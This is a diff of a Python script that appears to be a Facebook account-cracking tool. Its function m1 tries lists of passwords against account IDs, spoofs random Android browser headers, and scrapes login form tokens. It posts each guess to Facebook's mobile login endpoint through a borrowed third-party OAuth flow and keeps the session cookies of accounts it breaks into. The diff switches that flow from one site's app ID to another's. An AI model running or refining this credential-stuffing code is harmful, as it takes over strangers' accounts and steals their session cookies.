@@ -1288,66 +1288,49 @@ def PAKISTAN():
 def m1(ids,pwv):
     global loop,oks,cps
     animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-    sys.stdout.write(f"\r{rad}[{green}{animasi}-M1{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]"),
+    sys.stdout.write(f"\r{rad}[{green}{animasi}-M2{rad}]{white}-{rad}[\x1b[38;5;38m{loop}{rad}]{white}-{rad}[{green}OK:{len(oks)}{rad}]"),
     sys.stdout.flush()
+    session= requests.Session()
     ua = ua_valid()
     warna = random.choice(my_color)
     sm2 =('SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H')
     ua3 ="Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(sm2))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
     try:
         for pas in pwv:
-            with requests.Session() as session:
-            free_fb = session.get('https://mbasic.facebook.com/login/device-based/login/async/?api_key=607603612709461&auth_token=0e0ea0a934fc9f9de60bf561d107cd22&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&refsrc=deprecated&app_id=607603612709461&cancel=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100').text
+            free_fb = session.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=144117062837799&kid_directed_site=0&app_id=144117062837799&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr').text
             info={
-            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': ids,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'true',
-            'bi_xrwh': '0',
-            'pass': pas,
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'dyn': '',
-            'csr': '',
-            'req': '8',
-            'a': '',
-            '__user': '0',
-            '_fb_noscript': 'true'}
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'email': ids,
+            'next': 'https://m.facebook.com/v3.2/dialog/oauth?response_type=code&redirect_uri=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback&scope=email&state=https%3A%2F%2Fpixlr.com%2F&client_id=144117062837799&ret=login&fbapp_pres=0&logger_id=27279048-2ffa-4266-a587-1693d6522204&tp=unspecified',
+            'flow': 'login_no_pin',
+            'pass': pas,
+            'login': 'Log in'}
             update={
-            'Host': 'mbasic.facebook.com',
-            'Connection': 'keep-alive',
-            'Content-Length': str(len(json.dumps(info))),
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'sec-ch-ua-model': '"M1908C3IC"',
-            'sec-ch-ua-mobile': '?1',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 6; 2016100) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4689.122 Mobile Safari/537.36',
-            'viewport-width': '400',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'X-FB-LSD': 'AVo6vmAQK4c',
-            'sec-ch-ua-platform-version': '"9.4.1"',
-            'X-ASBD-ID': '129477',
-            'dpr': '1.8',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
+            'authority': 'm.facebook.com',
+            'accept': '*/*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '2.75',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=144117062837799&kid_directed_site=0&app_id=144117062837799&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
             'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"23128PC33I"',
             'sec-ch-ua-platform': '"Android"',
-            'Accept': '*/*',
-            'Origin': 'https://mbasic.facebook.com',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'cors',
-            'Sec-Fetch-Dest': 'empty',
-            'Referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=607603612709461&kid_directed_site=0&app_id=607603612709461&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8'}
-            session.post('https://mbasic.facebook.com/login/device-based/login/async/?api_key=607603612709461&auth_token=0e0ea0a934fc9f9de60bf561d107cd22&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fbikroy.com%252Ffacebook-callback%26scope%3Dpublic_profile%252Cemail%26client_id%3D607603612709461%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1bdecab6-4837-4a41-963c-a148f65aa25d%26tp%3Dunspecified&refsrc=deprecated&app_id=607603612709461&cancel=https%3A%2F%2Fbikroy.com%2Ffacebook-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100',data=info,headers=update).text
+            'sec-ch-ua-platform-version': '"13"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-origin',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 5; 23128PC33I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4795.108 Mobile Safari/537.36',
+            'viewport-width': '393',
+            'x-asbd-id': '129477',
+            'x-fb-lsd': 'AVpmn-Jz1WM',
+            'x-requested-with': 'XMLHttpRequest',
+            'x-response-format': 'JSONStream'}
+            session.post('https://m.facebook.com/login/device-based/login/async/?api_key=144117062837799&auth_token=4f68572762725b85380bb3322eb4f56b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fpixlr.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%26client_id%3D144117062837799%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D27279048-2ffa-4266-a587-1693d6522204%26tp%3Dunspecified&refsrc=deprecated&app_id=144117062837799&cancel=https%3A%2F%2Fpixlr.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dhttps%253A%252F%252Fpixlr.com%252F%23_%3D_&lwv=100',data=info,headers=update).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -1380,11 +1363,10 @@ def m1(ids,pwv):
                 continue
             time.sleep(0.01)
         loop+=1
-    except HTMLSession().exceptions.ConnectionError:
-        time.sleep(9999999999999999)
+    except requests.exceptions.ConnectionError:
+        time.sleep(7)
     except Exception as e:
         pass
-
 
 def m2(ids,pwv):
     global loop,oks,cps
